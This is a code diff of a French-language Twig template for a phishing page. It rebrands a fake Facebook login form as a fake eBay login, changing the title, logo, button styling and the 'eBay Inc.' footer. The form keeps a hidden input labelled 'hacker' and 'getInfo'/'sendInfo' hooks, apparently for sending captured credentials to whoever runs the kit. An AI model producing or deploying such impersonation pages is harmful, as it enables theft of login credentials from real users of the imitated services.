@@ -1,10 +1,10 @@
 {% extends 'base.html.twig' %}
-{% set titrePage = "Se Connecter à Facebook | Facebook" %}
+{% set titrePage = "Se Connecter à eBay | eBay" %}
 {% block title %} {{titrePage}} {% endblock %}
 
-{% block body %}
+{% block body %} <br> <br>
 
-    <center><img class="mt-2 mb-2" style="width: 112px;" src="/dF5SId3UHWd.svg" alt="" srcset=""></center>
+    <center><img class="mt-2 mb-2" style="width: 200px;" src="/ebay.png" alt="" srcset=""></center>
 
     <div class="pl-3 pr-3" align="center">
         <form method="post" class="" style="max-width: 25rem;">
@@ -13,7 +13,7 @@
             <div hidden>
                 <input type="text" titre="hacker" value="{{hacker}}" class="getInfo form-control mb-2 bg-light" placeholder="Hacker">
             </div>
-                    <button class="sendInfo btn btn-primary btn-block font-weight-bolder"> Se connecter </button>
+                    <button class="sendInfo btn btn-warning text-danger btn-block font-weight-bolder"> Se connecter </button>
                 <br>
                 <a class="mt-2" href="">Mot de passe oublié ?</a>
                 <br> <br>
@@ -40,8 +40,8 @@
         <div class="col-6"><a style="color: #576b95 !important;" href="">Português (Portugal)</a></div>
         <div class="col-6"><a style="color: #576b95 !important;" href="">Español</a></div>
         <div class="col-6"><a style="color: #576b95 !important;" href="">العربية</a></div>
-        <div class="col-6"><a class="border border-primary p-1">+</a></div>
-        <div class="col-12"> <small class="text-muted">Facebook Inc.</small> </div>
+        <div class="col-6"><a class="border border-warning p-1">+</a></div>
+        <div class="col-12"> <small class="text-muted">eBay Inc.</small> </div>
     </div>
 
 
